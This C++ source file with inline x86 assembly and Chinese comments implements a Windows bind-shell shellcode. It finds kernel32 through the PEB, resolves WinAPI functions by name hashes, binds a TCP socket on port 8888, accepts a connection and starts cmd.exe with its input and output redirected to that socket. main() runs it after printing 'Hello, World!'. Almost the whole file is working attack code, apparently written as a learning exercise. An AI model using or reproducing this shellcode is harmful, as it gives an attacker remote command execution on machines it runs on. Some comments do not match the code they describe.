#include <Windows.h>
#include <iostream>

void _declspec(naked) shellcode() {
	_asm {
		//1.保存字符串信息
		//kernel32.dll，ws2_32.dll，cmd.exe
		
		//LoadLibraryA c917432 kernel32/kernelbase
		//ExitProcess 4fd18963 kernel32.dll
		//WSAStartup 80b46a3d ws2_32.dll
		//WSASocketA de78322d ws2_32.dll
		//bind dda71064 ws2_32.dll
		//listen 4bd39f0c ws2_32.dll
		//accept 1971eb1 ws2_32.dll
		//CreateProcessA 6ba6bcc9 kernel32.dll
		//CloseHandle ff0d6657 kernel32.dll
		//closesocket d1290f4c ws2_32.dll
		 //WSACleanup 7c9be27c ws2_32.dll
		
		//注意：因为ws2_32.dll会检查堆栈是否是4的倍数（是否对齐），
		// 所以这样的push方法会报错
		// 
		////字符串00结尾
		//pushad
		//mov ebp, esp
		//sub esp, 0x50

		//// cmd.exe
		//// cmd.exe 63 6D 64 2E   65 78 65 00    0x8
		//push 0x00657865 
		//push 0x2e646d63


		////kernel32.dll
		////kernel32.dll 6B 65 72 6E   65 6C 33 32   2E 64 6C 6C  00 0xd
		//mov byte ptr[esp - 1], 0x0
		//sub esp, 0x1
		//push 0x6c6c642e 
		//push 0x32336c65
		//push 0x6e72656b

		////ws2_32.dll
		////ws2_32.dll  77 73 32 5F   33 32 2E 64   6C 6C 00  0xb
		//mov byte ptr[esp - 0x1], 0x0
		//sub esp, 0x1
		//mov word ptr[esp - 0x2], 0x6c6c
		//sub esp, 0x2
		//push 0x642e3233
		//push 0x5f327377

		//mov ecx, esp //ecx指向字符串首地址
		//push ecx
		//call fun_payload
		//popad


		//所以改成下面的方法，最终检测发现堆栈还是只有0x50，是4的倍数，对齐值没有变化
		push ebp
		mov ebp, esp
		push ecx
		sub esp, 0x30

		// cmd.exe
		// cmd.exe 63 6D 64 2E   65 78 65 00    0x8
		mov dword ptr [ebp-0x4], 0x00657865
		mov dword ptr[ebp - 0x8], 0x2e646d63


		//kernel32.dll
		//kernel32.dll 6B 65 72 6E   65 6C 33 32   2E 64 6C 6C  00 0xd
		mov byte ptr[ebp - 0x9], 0x0
		mov dword ptr[ebp - 0xd], 0x6c6c642e
		mov dword ptr[ebp - 0x11], 0x32336c65
		mov dword ptr[ebp - 0x15], 0x6e72656b

		//ws2_32.dll
		//ws2_32.dll  77 73 32 5F   33 32 2E 64   6C 6C 00  0xb
		mov byte ptr[ebp - 0x16], 0x0
		mov word ptr[ebp - 0x18], 0x6c6c
		mov dword ptr[ebp - 0x1c], 0x642e3233
		mov dword ptr[ebp - 0x20], 0x5f327377

		lea ecx, [ebp - 0x20] //ecx指向字符串首地址
		push ecx
		call fun_payload





		//2. 通过fs寄存器获取kernel32.dll基址
		//函数中除了eax的其他寄存器如果要使用要在函数开头push并且函数结尾pop，
		//但eax不需要push，eax可以随意使用。
		//eax在函数中通常负责寄存器返回
	fun_GetModule:
		push ebp
			mov ebp, esp
			sub esp, 0xc
			push esi

			mov esi, dword ptr fs : [0x30] //获取PEB地址
			mov esi, [esi + 0xc] //获取LDR结构体地址
			mov esi, [esi + 0x1c]//list
			mov esi, [esi]//list第二项 kernel32.dll
			mov esi, [esi + 0x8]//kernel32.dll基址
			mov eax, esi //通常返回值放在eax中

			pop esi
			mov esp, ebp
			pop ebp
			retn


			//3. 获取导出表 根据导出表查找需要的函数
			//MyGetProcAddress(imageBase, hash)
			//ImageBase + 0x3C = NT头
			//NT头 + 0x78 = dataDirectory第一项 导出表
			//EAT = 导出表 + 0x1c
			//ENT = 导出表 + 0X20
			//EOT = 导出表 + 0x24
		fun_GetProcAddr:
		push ebp
			mov ebp, esp
			sub esp, 0x10
			push esi //EOT
			push edi //EOT
			push ebx
			push ecx //strlen
			push edx //imageBase

			mov edx, [ebp + 0x8]  //第一个参数imagebase（注意：+4是保存的返回地址）
			mov esi, [edx + 0x3c] //e_lfanew NT头偏移
			lea esi, [edx + esi] //NT头地址(imageBase + e_lfanew)
			lea esi, [esi + 0x18] //可选头地址
			mov esi, [esi + 0x60] //可选头地址+18+96=导出表RVA
			lea esi, [esi + edx] //export table VA
			mov edi, [esi + 0x1c] //EAT RVA
			lea edi, [edi + edx] //EAT VA
			mov[ebp - 0x4], edi //保存EAT VA,空出寄存器
			mov ebx, [esi + 0x20] //ENT RVA
			lea ebx, [ebx + edx] //ENT VA
			mov[ebp - 0x8], ebx //保存ENT VA,空出寄存器
			mov ecx, [esi + 0x24] //EOT RVA
			lea ecx, [ecx + edx] //EOT VA
			mov[ebp - 0xc], ecx //保存EOT VA,空出寄存器

			//4. 字符串比较函数
			// 直接利用cmp比较hashcode（dword）
			// 将所有要比较的函数名转换为hashcode
			xor ebx, ebx //ebx清零

			tag_cmp :
		mov edi, [ebp + 0xc] //hashcode参数
			mov esi, [ebp - 0x8] //ENT[0]地址
			mov esi, [esi + ebx * 4] //ENT[ebx]函数名RVA
			lea esi, [esi + edx] //ENT[ebx]函数名地址
			//mov[ebp - 0x10], esi //保存函数名地址
			//push [ebp - 0x10]
			push esi
			call fun_GetHashCode
			inc ebx
			cmp edi, eax //比较字符串
			jne tag_cmp //如果不相等继续比较下一个函数名

			// 如果相等则通过EOT获取EAT索引
			// 注意EOT是word
			dec ebx //ebx索引
			xor edi, edi //为了不影响结果清空edi
			mov esi, [ebp - 0xc] //EOT[0]地址
			mov di, [esi + ebx * 2] //EOT[ebx]序号 = EAT索引

			// 通过EAT索引获取函数地址
			mov esi, [ebp - 0x4] //EAT[0]地址
			mov esi, [esi + edi * 4] //EAT[edi]函数地址RVA
			lea eax, [esi + edx] //EAT[ebx]函数地址 

			pop edx
			pop ecx
			pop ebx
			pop edi
			pop esi
			mov esp, ebp
			pop ebp
			retn 0xc //清理参数堆栈（因为push进来了3个参数）

			fun_GetHashCode:
		push ebp
			mov ebp, esp
			sub esp, 0xc
			push esi
			push ebx
			push ecx
			push edx
			mov dword ptr[ebp - 0x4], 0

			//循环准备阶段
			mov esi, [ebp + 0x8] //strname地址
			xor eax, eax //eax清零
			xor ecx, ecx
			tag_loop :
		mov al, [esi + ecx] //获取第ecx个字符
			test al, al //检查是否为字符串结束符
			jz tag_out_loop //如果是字符串结束符则跳出循环
			mov ebx, [ebp - 0x4]
			shl ebx, 0x19 //左移25位
			mov edx, [ebp - 0x4]
			shr edx, 0x7 //右移7位
			or ebx, edx
			add ebx, eax //加上第一个字符
			mov[ebp - 0x4], ebx //保存到[ebp - 0x4]
			inc ecx
			jmp tag_loop //继续循环
			tag_out_loop :
		mov eax, [ebp - 0x4]
			pop edx
			pop ecx
			pop ebx
			pop esi
			mov esp, ebp
			pop ebp
			retn 0x4




		//5. payload函数
		fun_payload:
			push ebp
			mov ebp, esp
			sub esp, 0x100
			push esi
			push edi
			push ebx
			push ecx
			push edx
			//1. 先拿到kernel32/kernelbase dllbase
			call fun_GetModule
			mov[ebp - 0x4], eax //保存kernel32/kernelbase dllbase

			//2. 获取LoadLibraryA
			push 0x0c917432 
			push[ebp - 0x4] 
			call fun_GetProcAddr
			mov[ebp - 0x8], eax //保存LoadLibraryA地址

			//3. 调用LoadLibraryA 加载ws2_32.dll和kernel32
			//3.1 ws2_32.dll
			mov ebx, [ebp + 0x8]
			push ebx
			call[ebp - 0x8] 
			mov[ebp - 0xc], eax //保存ws2_32.dll base
			//3.2 kernel32
			mov ebx, [ebp + 0x8] 
			lea ebx, [ebx + 0xb] 
			push ebx
			call[ebp - 0x8] 
			mov[ebp - 0x10], eax //保存kernel32.dll base

			//4.通过fun_GetProcAddr(dllbase+function hash code)获取函数地址
			// 4.1 ExitProcess（kernel32.dll）
			push 0x4fd18963
			push[ebp - 0x10] //kernel32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x18], eax //保存ExitProcess地址
			// 4.2 WSAStartup（ws2_32.dll）
			push 0x80b46a3d
			push [ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x1c], eax //保存WSAStartup地址
			// 4.3 WSASocketA（ws2_32.dll）
			push 0xde78322d
			push[ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x20], eax //保存WSASocketA地址
			// 4.4 bind（ws2_32.dll）
			push 0xdda71064
			push[ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x24], eax //保存bind地址
			// 4.5 listen（ws2_32.dll）
			push 0x4bd39f0c
			push[ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x28], eax //保存listen地址
			// 4.6 accept（ws2_32.dll）
			push 0x1971eb1
			push[ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x2c], eax //保存accept地址
			// 4.7 CreateProcessA（kernel32.dll）
			push 0x6ba6bcc9
			push[ebp - 0x10] //kernel32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x30], eax //保存CreateProcessA地址
			// 4.8 CloseHandle（kernel32.dll）
			push 0xff0d6657
			push[ebp - 0x10] //kernel32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x34], eax //保存CloseHandle地址
			// 4.9 closesocket（ws2_32.dll）
			push 0xd1290f4c
			push[ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x38], eax //保存closesocket地址
			// 补充4.10 WSACleanup（ws2_32.dll）
			push 0x7c9be27c
			push[ebp - 0xc] //ws2_32.dll base
			call fun_GetProcAddr
			mov[ebp - 0x14], eax //保存WSACleanup地址
				

			//5.准备完成，完成bindshellcode
			//5.1 调用WSAStartup
				lea ebx, [ebp - 0x2300] //WSADATA结构体地址
				push ebx
				//xor eax,eax
				//mov ax, 0x0202 
				//push ax  
				push 0x202 //MSVC（Visual C++）不支持 push ax 这样的 16位压栈操作，所以直接压栈0x0202
				call[ebp - 0x1c]
				mov[ebp - 0x3c], eax //保存result值（后续应该补充判断）
				//5.2 调用WSASocketA
				push 0
				push 0
				push 0
				push 0x6
				push 0x1
				push 0x2
				call [ebp - 0x20] //WSASocketA
				mov[ebp - 0x40], eax //保存socket句柄
				//5.3 调用bind
				//初始化sockaddr_in，除了他要求的地方赋值，别的地方都不管
				// 注意！！！选择的位置要是空的，不能覆盖之前的内容
				lea edi, [ebp - 0x2230] //pinfo
				xor eax, eax; //把 EAX 清零，作为填充值 0
				mov ecx, 0x4;// ECX = 0x4（4次）用于循环计数
				cld; //清除方向标志（保证字符串操作从低地址向高地址移动）
				rep stosd; //重复执行 STOSD 指令 4 次，每次写入 4 字节（DWORD）
				mov word ptr[ebp - 0x2230], 2 //sin_family
				mov word ptr[ebp - 0x222E], 0xb822 //sin_port（8888=0x22b8,但是小端序b822）
				mov dword ptr[ebp - 0x222C], 0 //sin_addr.s_addr
				push 0x10 //16bytes长度
				lea ebx, [ebp - 0x2230] //sockaddr_in地址
				push ebx 
				push[ebp - 0x40] //socket句柄
				call[ebp - 0x24] //bind
				//5.4 调用listen
				push 0x7fffffff //最大连接数
				push[ebp - 0x40] //socket句柄
				call[ebp - 0x28] //listen
				//5.5 调用accept
				push 0
				push 0
				push[ebp - 0x40] //socket句柄
				call[ebp - 0x2c] //accept
				mov[ebp - 0x40], eax //保存accept返回的socket句柄
				//5.6 准备sinfo和pinfo
				lea edi,[ebp-0x2230] //pinfo
				xor eax, eax; //把 EAX 清零，作为填充值 0
				mov ecx, 0x4;// ECX = 0x11（17次）用于循环计数
				cld; //清除方向标志（保证字符串操作从低地址向高地址移动）
				rep stosd; //重复执行 STOSD 指令 17 次，每次写入 4 字节（DWORD）
				//stosd	把 eax 中的值写入 edi 指向的地址，然后 edi += 4
				//初始化STARTUPINFOA，将需要的区域清零
				lea edi, [ebp - 0x2300] //sinfo
				xor eax, eax; //把 EAX 清零，作为填充值 0
				mov ecx, 0x11;// ECX = 0x11（17次）用于循环计数
				cld; //清除方向标志（保证字符串操作从低地址向高地址移动）
				rep stosd; //重复执行 STOSD 指令 17 次，每次写入 4 字节（DWORD）
				lea ebx, [ebp - 0x2300] 
				mov dword ptr [ebx], 0x44 //sizeof(STARTUPINFOA) 68bytes
				mov word ptr[ebx + 0x30], 0 //12*4=48=0x30
				mov dword ptr[ebx + 0x2c], 0x100 //11*4=44=0x2c
				mov ecx, [ebp - 0x40]
				mov dword ptr[ebx + 0x38], ecx//12*4+2*2+4=56=0x38
				mov dword ptr[ebx + 0x3c], ecx //12*4+2*2+8=60=0x3c
				mov dword ptr[ebx + 0x40], ecx //12*4+2*2+12=64=0x40
				lea edx, [ebp - 0x2230] //pinfo
				push edx
				push ebx
				push 0
				push 0
				push 0
				push 1
				push 0
				push 0
				mov eax, [ebp + 0x8]
				lea eax, [eax + 0x18]
				push eax
				push 0
				call[ebp - 0x30] //CreateProcessA

				////注释的代码是为了演示如何调用CloseHandle和closesocket等函数
				//// 取消注释的话bind后就会关闭句柄，无法继续监听
				////5.7 调用CloseHandle
				//lea edx, [ebp - 0x2230]
				//push [edx]
				//call[ebp - 0x34] //CloseHandle
				//lea edx, [ebp - 0x222c]
				//push [edx]
				//call[ebp - 0x34] //CloseHandle
				////5.8 调用closesocket
				//push[ebp - 0x44] //accept返回的socket句柄
				//call[ebp - 0x38] //closesocket
				////5.9 调用WSACleanup
				//call[ebp - 0x14] //WSACleanup
				////6.ExitProcess
				//push 0
				//call[ebp - 0x18] //ExitProcess
				

			pop edx
			pop ecx
			pop ebx
			pop edi
			pop esi
			mov esp, ebp
			pop ebp
			retn 0x4
	}
}


int main() {
	printf("Hello, World!\n");
	//调用shellcode
	shellcode();
	return 0;
}